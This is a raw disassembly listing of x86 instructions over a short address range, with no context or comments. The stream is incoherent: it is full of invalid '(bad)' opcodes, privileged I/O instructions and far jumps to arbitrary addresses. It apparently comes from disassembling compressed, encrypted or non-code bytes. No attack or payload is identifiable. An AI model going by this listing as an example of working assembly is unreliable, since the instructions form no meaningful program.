  422b2d:	xchg   ebp,eax
  422b2e:	push   ds
  422b2f:	pop    es
  422b30:	xor    BYTE PTR [eax+0x135e1ac9],dl
  422b36:	pusha  
  422b37:	mov    edx,0xffebb02c
  422b3c:	lock and eax,0x3c94107c
  422b42:	jecxz  0x422b69
  422b44:	mov    ah,0x38
  422b46:	push   ds
  422b47:	or     BYTE PTR [edx-0x3f68fa9c],cl
  422b4d:	(bad)  
  422b4e:	cmp    DWORD PTR [ecx],eax
  422b50:	test   BYTE PTR [edx+0x7d94e1d],ch
  422b56:	cli    
  422b57:	pusha  
  422b58:	cmp    edi,DWORD PTR [edx+edx*4+0x329d2ec9]
  422b5f:	mov    WORD PTR [edi],cs
  422b61:	mov    esp,0x9a8aa7a2
  422b66:	loopne 0x422b05
  422b68:	cmp    al,0x1b
  422b6a:	inc    ebx
  422b6b:	popa   
  422b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b6d:	test   eax,0xf5b5d05f
  422b72:	sahf   
  422b73:	repnz xchg ebx,eax
  422b75:	mul    DWORD PTR [edi+0x25aa1952]
  422b7b:	adc    eax,0x34ecc956
  422b80:	stc    
  422b81:	xor    eax,ebp
  422b83:	mov    esp,0xf3388ee2
  422b88:	cwde   
  422b89:	imul   eax,DWORD PTR [ebx-0x60],0xc9356642
  422b90:	jo     0x422b3d
  422b92:	push   ecx
  422b93:	adc    al,0x8a
  422b95:	sbb    cl,BYTE PTR ds:0x49d42d17
  422b9b:	xchg   edx,eax
  422b9c:	cmp    BYTE PTR [edi],dh
  422b9e:	sbb    al,0xc
  422ba0:	xor    al,BYTE PTR ds:0x2ffa96d5
  422ba6:	sub    ch,BYTE PTR [edi+0x56]
  422ba9:	call   0x1299:0x89ac16d4
  422bb0:	dec    ebp
  422bb1:	mov    DWORD PTR [ebp-0x2496876c],eax
  422bb7:	jnp    0x422c38
  422bb9:	push   ebx
  422bba:	cdq    
  422bbb:	or     DWORD PTR [ebx+ebp*1+0x6515f04b],0x20781b69
  422bc6:	(bad)  
  422bc7:	hlt    
  422bc8:	sbb    BYTE PTR [ebp-0x50],dl
  422bcb:	dec    esp
  422bcc:	push   sp
  422bce:	mov    ah,0x6e
  422bd0:	popa   
  422bd1:	pop    es
  422bd2:	xchg   ecx,ebx
  422bd4:	xor    DWORD PTR [edi-0x54351a31],ecx
  422bda:	repnz fbstp TBYTE PTR [eax]
  422bdd:	cmova  edi,esi
  422be0:	xchg   esi,eax
  422be1:	nop
  422be2:	jge    0x422c2e
  422be4:	pushf  
  422be5:	mov    ds:0x56fd3841,al
  422bea:	xchg   esi,eax
  422beb:	and    ch,BYTE PTR [eax]
  422bed:	add    DWORD PTR [edx],edi
  422bef:	xchg   DWORD PTR [eax+esi*2-0x5a],edi
  422bf3:	push   ss
  422bf4:	test   DWORD PTR [edx],edx
  422bf6:	add    edx,DWORD PTR [eax]
  422bf8:	mov    ch,0x8a
  422bfa:	sbb    ebp,eax
  422bfc:	jp     0x422c6f
  422bfe:	jmp    0x422bcd
  422c00:	pop    ecx
  422c01:	loopne 0x422c5d
  422c03:	js     0x422b92
  422c05:	or     esp,DWORD PTR [eax+esi*2+0x7cdfc92c]
  422c0c:	mov    eax,ds:0x3118f6d0
  422c11:	sti    
  422c12:	sub    DWORD PTR [ecx-0x4b],esi
  422c15:	dec    esp
  422c16:	mov    ch,0x5c
  422c18:	xlat   BYTE PTR ds:[ebx]
  422c19:	shl    esi,0x24
  422c1c:	jmp    0xccfeb815
  422c21:	pop    ebx
  422c22:	out    dx,eax
  422c23:	cwde   
  422c24:	pop    ebp
  422c25:	pop    ebx
  422c26:	std    
  422c27:	mov    eax,ds:0xa93d4b73
  422c2c:	(bad)  
  422c2d:	aad    0xb4
  422c2f:	jecxz  0x422c6f
  422c31:	daa    
  422c32:	gs push ebx
  422c34:	add    DWORD PTR [eax+edi*1+0x222bbd20],0x2b
  422c3c:	repnz std 
  422c3e:	stos   DWORD PTR es:[edi],eax
  422c3f:	mov    esp,0xdf27f0fe
  422c44:	les    eax,FWORD PTR [ecx]
  422c46:	ds mov ah,0xb3
  422c49:	push   0x76ddc0e0
  422c4e:	xor    al,0x91
  422c50:	rcl    DWORD PTR [esi+0x32],1
  422c53:	xor    eax,0xe9b7f1ef
  422c58:	cmp    bl,BYTE PTR [eax+ecx*8+0x55]
  422c5c:	mov    eax,0x77e6e33
  422c61:	mov    cs,WORD PTR [ebx-0x43]
  422c64:	bound  esp,QWORD PTR [ebx+0x8]
  422c67:	jg     0x422cad
  422c69:	push   0xffffffc6
  422c6b:	addr16 mov bh,0xb4
  422c6e:	les    esi,FWORD PTR cs:[edi+0x508e3cd1]
  422c75:	add    al,0xf3
  422c77:	outs   dx,BYTE PTR ds:[esi]
  422c78:	mul    BYTE PTR [edx]
  422c7a:	push   ebp
  422c7b:	pop    ebp
  422c7c:	es cmp al,0xa4
  422c7f:	xor    ebx,DWORD PTR [edx+0x3b]
  422c82:	outs   dx,BYTE PTR ds:[esi]
  422c83:	push   ebx
  422c84:	fdiv   DWORD PTR [ebp-0x46]
  422c87:	dec    eax
  422c88:	aad    0xc2
  422c8a:	inc    ebp
  422c8b:	push   edi
  422c8c:	imul   BYTE PTR ds:0xc28b92fa
  422c92:	add    dl,BYTE PTR [ecx+0x34e215b1]
  422c98:	dec    eax
  422c99:	rol    DWORD PTR [edx],0x68
  422c9c:	push   0xfac8a3c2
  422ca1:	cwde   
  422ca2:	jae    0x422cad
  422ca4:	jb     0x422cb3
  422ca6:	ror    DWORD PTR ds:0x49c9dcb3,0x7f
  422cad:	xor    cl,BYTE PTR [ecx]
  422caf:	aad    0x5f
  422cb1:	es mov dl,0xf5
  422cb4:	xor    DWORD PTR [ecx-0x463837af],ecx
  422cba:	add    esi,eax
  422cbc:	xchg   ecx,eax
  422cbd:	stos   BYTE PTR es:[edi],al
  422cbe:	nop
  422cbf:	pushf  
  422cc0:	les    eax,FWORD PTR [edx-0x42876d68]
  422cc6:	aas    
  422cc7:	sar    ah,cl
  422cc9:	aas    
  422cca:	add    ah,al
  422ccc:	hlt    
  422ccd:	xor    eax,0x5df00b0d
  422cd2:	es pop ecx
  422cd4:	sar    DWORD PTR [edx-0x12415a5a],0xf6
  422cdb:	add    al,0x6d
  422cdd:	inc    edi
  422cde:	dec    eax
  422cdf:	adc    ecx,edx
  422ce1:	imul   ebp,DWORD PTR [eax-0x65b47456],0x38
  422ce8:	mov    dh,0xf5
  422cea:	sti    
  422ceb:	loop   0x422cac
  422ced:	sti    
  422cee:	jecxz  0x422d43
  422cf0:	in     eax,0x89
  422cf2:	call   0x6e09:0xe04ffed7
  422cf9:	addr16 mov ds:0x2642,eax
  422cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cfe:	adc    eax,0xf2b7cc81
  422d03:	cmp    DWORD PTR [ebx-0x7073d62e],edi
  422d09:	fsubr  DWORD PTR [eax-0x77]
  422d0c:	jns    0x422d25
  422d0e:	sbb    ebx,DWORD PTR [ebx]
  422d10:	xchg   ecx,eax
  422d11:	imul   edi,DWORD PTR [edi],0xffffffc5
  422d14:	retf   
  422d15:	push   edi
  422d16:	sub    ebx,DWORD PTR [esi+ecx*2]
  422d19:	cmc    
  422d1a:	dec    esp
  422d1b:	mov    bh,0x25
  422d1d:	jb     0x422d2a
  422d1f:	pop    ebp
  422d20:	or     DWORD PTR [edi-0x48],edx
  422d23:	add    DWORD PTR [ebx+0x464a4fd7],esp
  422d29:	jmp    0xf931:0x14693bda
  422d30:	fldcw  WORD PTR [eax]
  422d32:	sub    edx,DWORD PTR [edx-0x46]
  422d35:	cmp    al,0xd9
  422d37:	push   edi
  422d38:	fmul   st(0),st
  422d3a:	adc    eax,0x89b1c839
  422d3f:	cwde   
  422d40:	and    BYTE PTR [esi-0xe],0xab
  422d44:	sar    BYTE PTR [edi],0x45
  422d47:	jg     0x422ce7
  422d49:	shr    BYTE PTR [ecx-0x1b4f78d2],cl
  422d4f:	mov    dl,0x94
  422d51:	lahf   
  422d52:	sub    eax,0x3cb7ef20
  422d57:	jl     0x422d2a
  422d59:	sub    bl,ch
  422d5b:	in     eax,dx
  422d5c:	cdq    
  422d5d:	pop    ecx
  422d5e:	stos   BYTE PTR es:[edi],al
  422d5f:	out    dx,al
  422d60:	pop    ebp
  422d61:	scas   al,BYTE PTR es:[edi]
  422d62:	lds    edx,FWORD PTR [eax+0x43d3d219]
  422d68:	sbb    eax,edx
  422d6a:	sub    DWORD PTR [eax],eax
  422d6c:	ss jmp esi
  422d6f:	punpckhwd mm6,QWORD PTR [edx+0xb]
  422d73:	cld    
  422d74:	xor    BYTE PTR [ecx],dl
  422d76:	loope  0x422dea
  422d78:	pop    eax
  422d79:	test   DWORD PTR [edx+0x786c01bb],0xc2c7ce20
  422d83:	stc    
  422d84:	stc    
  422d85:	clc    
  422d86:	jl     0x422de4
  422d88:	stos   DWORD PTR es:[edi],eax
  422d89:	(bad)  
  422d8a:	out    0xb4,eax
  422d8c:	aaa    
  422d8d:	idiv   BYTE PTR [ebx]
  422d8f:	shr    bh,1
  422d91:	cld    
  422d92:	push   ds
  422d93:	push   esp
  422d94:	mov    ah,BYTE PTR [ebx]
  422d96:	int    0x5b
  422d98:	lock mov dl,0x59
  422d9b:	cmc    
  422d9c:	inc    edx
  422d9d:	fsub   st(2),st
  422d9f:	neg    bh
  422da1:	ins    BYTE PTR es:[edi],dx
  422da2:	mov    ebx,0xa4136568
  422da7:	inc    ebx
  422da8:	rcl    DWORD PTR [edi-0x1c],0x7c
  422dac:	mov    WORD PTR [edx-0x21],?
  422daf:	(bad)  [esi-0x3ea9fd63]
  422db5:	mov    WORD PTR [edx+0x64],ss
  422db8:	xchg   ecx,eax
  422db9:	out    0x64,eax
  422dbb:	sub    BYTE PTR [eax],al
  422dbd:	int    0xca
  422dbf:	sbb    ebx,DWORD PTR [ebx+0x3ed3ed79]
  422dc5:	dec    ebp
  422dc6:	jne    0x422dec
  422dc8:	xor    al,BYTE PTR [eax+0x21]
  422dcb:	cmp    ch,dh
  422dcd:	push   edi
  422dce:	aas    
  422dcf:	cli    
  422dd0:	mov    bh,0xe5
  422dd2:	and    dh,bh
  422dd4:	(bad)  
  422dd5:	mov    ebp,0x30c08c
  422dda:	mov    bl,0xfc
  422ddc:	lahf   
  422ddd:	fst    st(2)
  422ddf:	ins    BYTE PTR es:[edi],dx
  422de0:	or     esi,DWORD PTR [ecx-0x79]
  422de3:	xchg   ebp,eax
  422de4:	push   DWORD PTR [edi+0x2be85542]
  422dea:	dec    edi
  422deb:	xacquire xchg DWORD PTR [eax-0x8e9ff6b],ebx
  422df2:	iret   
  422df3:	addr16 inc esi
  422df5:	xor    BYTE PTR [edi],bl
  422df7:	pop    ebx
  422df8:	loope  0x422e44
  422dfa:	mov    ds:0x7eb6db1f,eax
  422dff:	in     al,0x46
  422e01:	adc    DWORD PTR [ebx-0x5552226],ebx
  422e07:	sar    bh,cl
  422e09:	fsub   QWORD PTR [ecx-0x79d7f03e]
  422e0f:	adc    ecx,edi
  422e11:	cwde   
  422e12:	dec    BYTE PTR [edi]
  422e14:	push   ebp
  422e15:	pop    bx
  422e17:	loopne 0x422dd8
  422e19:	sbb    BYTE PTR [edi+0x4b],0xb1
  422e1d:	test   al,0x4e
  422e1f:	aaa    
  422e20:	sbb    DWORD PTR [ebp-0x566d45dd],edi
  422e26:	xor    al,0x53
  422e28:	ror    BYTE PTR [eax-0x5508e39b],cl
  422e2e:	test   eax,0x5878a724
  422e33:	mov    ah,0xa5
  422e35:	mov    bh,0x8f
  422e37:	mov    ds:0xe8ac161b,eax
  422e3c:	les    esi,FWORD PTR [ecx+0x1a]
  422e3f:	sub    eax,DWORD PTR [eax-0x46d5cdab]
  422e45:	cdq    
  422e46:	jnp    0x422e15
  422e48:	dec    edx
  422e49:	loope  0x422e87
  422e4b:	mov    ebx,0x6ccd6040
  422e50:	and    ch,BYTE PTR [ebx+0x3db90f52]
  422e56:	xchg   al,al
  422e58:	in     eax,0x1f
  422e5a:	or     al,0xb8
  422e5c:	cmp    BYTE PTR [ebx+eax*1],cl
  422e5f:	ja     0x422e80
  422e61:	mul    BYTE PTR [edx]
  422e63:	push   es
  422e64:	retf   0x7f2c
  422e67:	int    0x20
  422e69:	jp     0x422e67
  422e6b:	in     eax,0xbc
  422e6d:	cwde   
  422e6e:	jmp    0x9a3a:0x974ac720
  422e75:	jmp    0x116d74d4
  422e7a:	cs xor ebp,edi
  422e7d:	cmp    DWORD PTR [ecx],0x676ad9ad
  422e83:	xor    al,0x42
  422e85:	loope  0x422ec1
  422e87:	sbb    al,0x85
  422e89:	test   eax,0x7e4d9dc8
  422e8e:	xor    BYTE PTR [ebx+0x55],ah
  422e91:	call   0x468708eb
  422e96:	ins    BYTE PTR es:[edi],dx
  422e97:	xchg   esp,eax
  422e98:	cs inc ebp
  422e9a:	push   edx
  422e9b:	mov    edi,0x42c536ed
  422ea0:	bound  eax,QWORD PTR [ebx]
  422ea2:	mov    ds:0x23ce3452,eax
  422ea7:	mov    ah,0xcc
  422ea9:	mov    bh,0xb3
  422eab:	(bad)  
  422eac:	ficomp WORD PTR [ecx-0x480e82c2]
  422eb2:	xchg   edx,eax
  422eb3:	jle    0x422e45
  422eb5:	shr    DWORD PTR [ebp-0x57930f3f],cl
  422ebb:	add    al,0x94
  422ebd:	cdq    
  422ebe:	sar    DWORD PTR [esi],0x99
  422ec1:	mov    ds:0x7e5397d,al
  422ec6:	imul   edx,ecx,0xfffffff7
  422ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eca:	jp     0x422e99
  422ecc:	inc    ecx
  422ecd:	aam    0xe3
  422ecf:	pop    esi
  422ed0:	das    
  422ed1:	or     DWORD PTR [ebp+0x323224e3],0xdbe62ddf
  422edb:	mov    ebx,0xd66ae828
  422ee0:	inc    edi
  422ee1:	jge    0x422e92
  422ee3:	nop
  422ee4:	hlt    
  422ee5:	adc    cl,dl
  422ee7:	out    0xb0,ax
  422eea:	or     eax,0x71764fa6
  422eef:	test   BYTE PTR [edi],0x4b
  422ef2:	rcl    DWORD PTR [esi],0xa1
  422ef5:	fild   DWORD PTR [eax-0x7b]
  422ef8:	inc    eax
  422ef9:	adc    al,0xf6
  422efb:	fbld   TBYTE PTR [edx]
  422efd:	jmp    0x19fe:0x59e11ade
  422f04:	push   ss
  422f05:	push   ds
  422f06:	and    eax,0xefb9f84b
  422f0b:	mov    esp,0xdaf4623a
  422f10:	mov    WORD PTR [ebp+0x27],fs
  422f13:	pop    ebp
  422f14:	or     eax,ebx
  422f16:	adc    ch,BYTE PTR [edx]
  422f18:	scas   al,BYTE PTR es:[edi]
  422f19:	pop    es
  422f1a:	inc    esp
  422f1b:	mov    edx,0x445d53ab
  422f20:	popa   
  422f21:	push   edi
  422f22:	aas    
  422f23:	mov    bl,0x4e
  422f25:	test   ah,dl
  422f27:	xor    al,0xe0
  422f29:	div    DWORD PTR ds:[esi+0x4f]
  422f2d:	scas   al,BYTE PTR es:[edi]
  422f2e:	xor    edx,DWORD PTR [ebp+0x4a1c34bf]
  422f34:	fdivr  QWORD PTR [esp+ebx*1+0x4b]
  422f38:	push   cs
  422f39:	fist   WORD PTR [edx-0x201972ef]
  422f3f:	inc    edi
  422f40:	jle    0x422f5a
  422f42:	cli    
  422f43:	fisttp WORD PTR [esi+eiz*8-0x6647681f]
  422f4a:	mov    ds:0xc0f78f4e,al
  422f4f:	add    ebp,DWORD PTR [edx+0x7e]
  422f52:	or     esi,0xffffff8d
  422f55:	lods   eax,DWORD PTR ds:[esi]
  422f56:	adc    BYTE PTR [ebx+0x112754ad],ah
  422f5c:	mov    esp,0xb543ea0
  422f61:	and    eax,0x48df03d6
  422f66:	out    0x54,al
  422f68:	sub    esi,DWORD PTR [edi]
  422f6a:	cmp    eax,0x97ffafc0
  422f6f:	jno    0x422f0b
  422f71:	cmp    eax,0x1395a43b
  422f76:	popf   
  422f77:	jbe    0x422fa5
  422f79:	sub    al,0x1d
  422f7b:	sti    
  422f7c:	outs   dx,DWORD PTR ds:[esi]
  422f7d:	out    0x23,eax
  422f7f:	mov    al,0x40
  422f81:	int3   
  422f82:	dec    eax
  422f83:	ss add al,0xb7
  422f86:	sbb    esi,DWORD PTR [edx]
  422f88:	jmp    0x68eee469
  422f8d:	shr    BYTE PTR [edi-0x3],0x81
  422f91:	lods   eax,DWORD PTR ds:[esi]
  422f92:	mov    ds:0x95af7b84,al
  422f97:	and    eax,0xb0ae2397
  422f9c:	sub    eax,0x5911cd
  422fa1:	data16 clc 
  422fa3:	push   edi
  422fa4:	inc    esi
  422fa5:	std    
  422fa6:	fstp   QWORD PTR [ebp-0x5e]
  422fa9:	mov    dl,0x9c
  422fab:	pop    edx
  422fac:	xor    al,0x1d
  422fae:	xchg   edx,eax
  422faf:	xor    BYTE PTR [ecx+0x3b94da6f],0x3f
  422fb6:	mov    ch,0x1b
  422fb8:	or     bh,BYTE PTR [edx-0xeef582f]
  422fbe:	mov    ebp,0xa72467fd
  422fc3:	dec    esi
  422fc4:	pop    ebp
  422fc5:	ret    
  422fc6:	push   edx
  422fc7:	lahf   
  422fc8:	push   eax
  422fc9:	mov    eax,0xfa8cc2c3
  422fce:	xor    eax,0xc1f96f3b
  422fd3:	stc    
  422fd4:	add    esp,DWORD PTR [esi]
  422fd6:	and    DWORD PTR [esi-0x2c],0x40
  422fda:	ja     0x422f7d
  422fdc:	mov    al,ds:0x32c13a03
  422fe1:	inc    ebp
  422fe2:	sub    ebp,DWORD PTR [eax]
  422fe4:	(bad)  
  422fe5:	fistp  DWORD PTR [ebp+0x2d]
  422fe8:	adc    ebp,DWORD PTR [ecx+0x2e]
  422feb:	ficomp WORD PTR [ecx]
  422fed:	cmp    DWORD PTR [edx],edx
  422fef:	pop    ebp
  422ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ff1:	fnstcw WORD PTR [ebx-0x365a1ffc]
  422ff7:	ret    
  422ff8:	dec    esp
  422ff9:	pushf  
  422ffa:	mov    edx,0xa2339a22
  422fff:	in     al,dx
  423000:	cmp    cl,BYTE PTR ds:0xa2804115
  423006:	out    dx,eax
  423007:	mov    bl,0x49
  423009:	icebp  
  42300a:	push   ebp
  42300b:	fsub   DWORD PTR [ebx-0x49986d7]
  423011:	repnz in eax,0x5f
  423014:	in     al,0x41
  423016:	pop    ds
  423017:	xchg   ebx,eax
  423018:	mov    es:0xbef3d9cb,al
  42301e:	mov    ebp,0xaf681626
  423023:	outs   dx,BYTE PTR ds:[esi]
  423024:	mov    ebp,0x73871bc8
  423029:	mov    bh,ch
  42302b:	cld    
  42302c:	mov    al,0x2c
  42302e:	cld    
  42302f:	cmp    bl,ah
  423031:	fadd   DWORD PTR [edx-0x75]
  423034:	xchg   ecx,eax
  423035:	in     eax,0xdc
  423037:	fbstp  TBYTE PTR [edi+0x3e]
  42303a:	sar    DWORD PTR ds:0x5ee325d2,0xd1
  423041:	dec    esp
  423042:	mov    DWORD PTR [ecx],edx
  423044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423045:	cld    
  423046:	inc    edx
  423047:	hlt    
  423048:	mov    al,ds:0xe9be7b25
  42304d:	dec    ecx
  42304f:	shr    BYTE PTR [ebx+0x7a],cl
  423052:	xchg   ebx,eax
  423053:	ja     0x4230af
  423055:	shl    DWORD PTR [edx-0x76],0xff
  423059:	fprem  
  42305b:	aas    
  42305c:	popf   
  42305d:	jle    0x423081
  42305f:	xor    ah,BYTE PTR [ebp-0x15d52086]
  423065:	dec    esi
  423066:	pop    ss
  423067:	push   ecx
  423068:	stc    
  423069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42306a:	cmp    eax,0xd977368d
  42306f:	repnz mov edx,0x5e64336
  423076:	cdq    
  423077:	retf   
  423078:	dec    esi
  423079:	push   0xfffffff5
  42307b:	xor    BYTE PTR [edx],dl
  42307d:	mov    esi,0x25433347
  423082:	sub    al,0xa8
  423084:	js     0x42305b
  423086:	fcomp  DWORD PTR [edx-0x6f5247d3]
  42308c:	lods   eax,DWORD PTR ds:[esi]
  42308d:	mov    ah,0x17
  42308f:	imul   ecx,edx,0xc5d418b1
  423095:	js     0x423029
  423097:	loop   0x4230b4
  423099:	mov    ds:0x763a8e54,al
  42309e:	push   esp
  42309f:	add    DWORD PTR [edx-0x5f24eac],esp
  4230a5:	arpl   WORD PTR [eax+0x67],ax
  4230a8:	push   ecx
  4230a9:	test   DWORD PTR [ecx+0x1],eax
  4230ac:	xchg   edx,eax
  4230ad:	xchg   ebp,eax
  4230ae:	push   esi
  4230af:	into   
  4230b0:	and    al,0x6a
  4230b2:	mov    ebx,DWORD PTR [edx-0x48e635fe]
  4230b8:	cmp    eax,DWORD PTR [esp+edi*4]
  4230bb:	addr16 (bad) 
  4230bd:	scas   al,BYTE PTR es:[edi]
  4230be:	hlt    
  4230bf:	js     0x42306a
  4230c1:	(bad)  
  4230c2:	dec    ebp
  4230c3:	fild   WORD PTR [esp+eax*2]
  4230c6:	pop    ecx
  4230c7:	xor    BYTE PTR [esp+ebp*2],cl
  4230ca:	mov    al,0xed
  4230cc:	stos   BYTE PTR es:[edi],al
  4230cd:	ins    DWORD PTR es:[edi],dx
  4230ce:	sbb    al,BYTE PTR [esi-0x208375df]
  4230d4:	inc    ecx
  4230d5:	pop    es
  4230d6:	jg     0x4230db
  4230d8:	fsubr  DWORD PTR [ebp-0x50]
  4230db:	and    al,0xb5
  4230dd:	mov    esp,0xd1defb65
  4230e2:	ret    
  4230e3:	ret    0x7426
  4230e6:	fcom   DWORD PTR [eax-0x5]
  4230e9:	lds    esp,FWORD PTR [ecx]
  4230eb:	sub    al,0xd7
  4230ed:	pop    ecx
  4230ee:	xchg   esi,eax
  4230ef:	mov    esi,0x66e0cb
  4230f4:	into   
  4230f5:	or     bh,0x2e
  4230f8:	or     ecx,ebp
  4230fa:	dec    edx
  4230fb:	iret   
  4230fc:	sub    eax,0x6ca3e8c4
  423101:	out    0xa3,eax
  423103:	pop    ss
  423104:	call   0xdc63:0x7c99635
  42310b:	push   eax
  42310c:	sub    esi,DWORD PTR [eax+0xa43a0e5]
  423112:	pop    edi
  423113:	test   eax,0xf7a9d817
  423118:	dec    ecx
  423119:	and    BYTE PTR [edx-0x37],al
  42311c:	or     bh,0xcf
  42311f:	ret    
  423120:	cld    
  423121:	dec    ebx
  423122:	ins    DWORD PTR es:[edi],dx
  423123:	fldpi  
  423125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423126:	ret    
  423127:	or     DWORD PTR [eax-0x1865837a],ebx
  42312d:	jmp    FWORD PTR [edx+eiz*1]
  423130:	add    DWORD PTR [ebx],0x78fe0e73
  423136:	fldenv [edx-0x33]
  423139:	and    DWORD PTR [esi],ecx
  42313b:	das    
  42313c:	outs   dx,DWORD PTR ds:[esi]
  42313d:	rol    BYTE PTR [edx+0x4e],1
  423140:	inc    ebx
  423141:	sbb    eax,0x71015f84
  423146:	test   eax,0x42b35d78
  42314b:	shl    bh,1
  42314d:	dec    ecx
  42314e:	dec    esi
  42314f:	cwde   
  423150:	call   0x2f4e02b0
  423155:	sbb    ebp,edi
  423157:	adc    ah,BYTE PTR [ebp+eiz*8-0xcc1089d]
  42315e:	fwait
  42315f:	(bad)  
  423160:	pop    ds
  423161:	aas    
  423162:	push   ds
  423163:	nop
  423164:	aam    0x53
  423166:	pop    esp
  423167:	xchg   ebp,eax
  423168:	ins    BYTE PTR es:[edi],dx
  423169:	daa    
  42316a:	push   cs
  42316b:	mov    ebx,0xc123e705
  423170:	mov    esi,0xa3722ffc
  423175:	and    eax,0x6256ed36
  42317a:	addr16 cmp dl,cl
  42317d:	mov    ds:0x569abf2f,al
  423182:	test   BYTE PTR [edx-0x17],bl
  423185:	out    0xc,al
  423187:	sbb    BYTE PTR [edi+ebx*4],dl
  42318a:	js     0x423202
  42318c:	into   
  42318d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42318e:	adc    al,0x7a
  423190:	cmp    BYTE PTR [edx+esi*1],ah
  423193:	pop    ebp
  423194:	mov    ecx,0x90c0c843
  423199:	sub    eax,0x11b8519a
  42319e:	add    ebp,DWORD PTR [ebx+edi*2-0x43]
  4231a2:	test   al,dl
  4231a4:	fcomip st,st(6)
  4231a6:	jmp    FWORD PTR [edx-0x14]
  4231a9:	test   BYTE PTR [ebx-0x3aca2d4d],0xca
  4231b0:	cmp    eax,0x9b95a86a
  4231b5:	ins    DWORD PTR es:[edi],dx
  4231b6:	pop    es
  4231b7:	jmp    0xe2ed:0xe83a5f00
  4231be:	scas   al,BYTE PTR es:[edi]
  4231bf:	jge    0x4231b0
  4231c1:	mov    ebx,cs
  4231c3:	dec    edi
  4231c4:	add    bh,ch
  4231c6:	sub    cl,BYTE PTR [edx+0x63]
  4231c9:	mov    bh,0xfe
  4231cb:	mov    fs,ebp
  4231cd:	pop    ebp
  4231ce:	mov    ebp,0xb03eee79
  4231d3:	add    eax,0x1af967c7
  4231d8:	fcmovnbe st,st(4)
  4231da:	mov    ebp,0x619b0d0a
  4231df:	out    dx,eax
  4231e0:	or     eax,0x12c607cb
  4231e5:	sti    
  4231e6:	mov    bl,0x45
  4231e8:	mov    ah,0x17
  4231ea:	sbb    DWORD PTR [ebx+0x357ea107],esp
  4231f0:	jnp    0x423224
  4231f2:	xor    BYTE PTR [esi-0x61],al
  4231f5:	retf   
  4231f6:	push   0xffffffca
  4231f8:	sbb    edx,DWORD PTR [ecx+0x5]
  4231fb:	cs sub dh,0x37
	...
  42323f:	add    BYTE PTR [eax],al
  423241:	add    BYTE PTR [ecx],bl
  423243:	je     0x423214
  423245:	(bad)  
  423246:	out    dx,eax
  423247:	(bad)  
  423248:	cmp    esi,esi
  42324a:	repnz sahf 
  42324c:	mov    ebx,0x7bff6c23
  423251:	xchg   edx,esp
  423253:	sbb    al,BYTE PTR [ecx]
  423255:	add    BYTE PTR ds:0xcb000007,ah
  42325b:	push   ds
  42325c:	into   
  42325d:	pop    ebx
  42325e:	mov    edx,0xeb77fdb3
  423263:	pop    ecx
  423264:	inc    eax
  423265:	add    eax,0x4add13b8
  42326a:	cld    
  42326b:	enter  0x818a,0xd9
  42326f:	outs   dx,DWORD PTR ds:[esi]
  423270:	repnz pop ebx
  423272:	fsubr  DWORD PTR [ebx-0x7f064a6e]
  423278:	xor    eax,0x63b8dc02
  42327d:	in     al,dx
  42327e:	in     al,dx
  42327f:	and    BYTE PTR [ebx+0x6f0d4b17],0xd
  423286:	adc    ebp,eax
  423288:	pop    edi
  423289:	fidiv  DWORD PTR [ebp-0x5f]
  42328c:	das    
  42328d:	lock dec edx
  42328f:	call   0x83b0:0x95c820c9
  423296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423297:	test   BYTE PTR [edi+eiz*1+0x526fc4b4],bh
  42329e:	sub    eax,0x924cd4f5
  4232a3:	adc    al,0x31
  4232a5:	inc    ebx
  4232a6:	mov    eax,0xb5c88d84
  4232ab:	or     ah,BYTE PTR [ecx-0x2bb8e0f1]
  4232b1:	jecxz  0x42323a
  4232b3:	cdq    
  4232b4:	push   ecx
  4232b5:	xchg   ebx,eax
  4232b6:	cmp    DWORD PTR [ebx-0x4],edx
  4232b9:	(bad)  
  4232ba:	fcmovnb st,st(7)
  4232bc:	daa    
  4232bd:	jb     0x42324b
  4232bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232c0:	mov    edx,0xa665d757
  4232c5:	inc    eax
  4232c7:	(bad)  
  4232c8:	fld    DWORD PTR [eax+0x68024fdf]
  4232ce:	pop    esi
  4232cf:	xchg   ebp,eax
  4232d0:	jno    0x42331f
  4232d2:	inc    eax
  4232d3:	xor    ebp,DWORD PTR [ecx-0x747cd185]
  4232d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232da:	icebp  
  4232db:	test   DWORD PTR [esi-0x6d33e25e],edi
  4232e1:	mov    ch,0x27
  4232e3:	retf   
  4232e4:	push   edx
  4232e5:	mov    bl,0x2f
  4232e7:	repz push es
  4232e9:	cwde   
  4232ea:	cli    
  4232eb:	xor    al,0x2a
  4232ed:	sub    bl,BYTE PTR [ecx+0x4d]
  4232f0:	sbb    BYTE PTR [esi+0x13ad6ff7],dh
  4232f6:	dec    esp
  4232f7:	shr    BYTE PTR [ebx],0x69
  4232fa:	into   
  4232fb:	ds retf 0x4b7f
  4232ff:	adc    eax,0x91b52507
  423304:	in     al,0x52
  423306:	cmc    
  423307:	xor    eax,0xa1128ecb
  42330c:	jns    0x4232e1
  42330e:	jbe    0x42335a
  423310:	ins    DWORD PTR es:[edi],dx
  423311:	and    ebp,edi
  423313:	cmp    esi,DWORD PTR [ebp+0x16f110db]
  423319:	je     0x42332a
  42331b:	outs   dx,BYTE PTR ds:[esi]
  42331c:	mov    cl,0x5b
  42331e:	lahf   
  42331f:	loope  0x4232d6
  423321:	(bad)  [eax]
  423323:	loopne 0x423393
  423325:	sbb    bl,BYTE PTR [edi]
  423327:	inc    esi
  423328:	add    eax,0x22b6bd67
  42332d:	pushf  
  42332e:	stc    
  42332f:	(bad)  
  423330:	test   eax,0xb782711e
  423335:	xchg   esi,eax
  423336:	popf   
  423337:	and    edx,DWORD PTR [esi-0x22]
  42333a:	pusha  
  42333b:	cmp    ebx,edx
  42333d:	cs test al,0xc9
  423340:	dec    ecx
  423341:	jp     0x4232de
  423343:	pop    edx
  423344:	dec    edx
  423345:	jae    0x423331
  423347:	enter  0x46bd,0xa1
  42334b:	inc    esi
  42334c:	mov    ch,0x3f
  42334e:	loope  0x423305
  423350:	mov    BYTE PTR [eax+0x4c],cl
